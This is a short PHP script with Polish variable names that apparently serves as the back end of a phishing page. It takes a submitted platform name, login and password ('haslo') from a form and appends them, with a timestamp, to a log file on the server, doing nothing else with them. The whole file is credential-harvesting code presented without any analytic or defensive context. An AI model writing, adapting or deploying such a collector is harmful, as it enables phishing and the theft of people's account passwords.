<?php
$log = "<center>Logowanie przez: ".$_POST['platforma']." || Login: ".$_POST['login']." || Hasło: ".$_POST['haslo']."  || kiedy: ".date('d:m:Y H:i')."</center><br>";
		$uchwyt = fopen("../logi/logikont.txt", "a");
		fwrite($uchwyt,$log);
		fclose($uchwyt);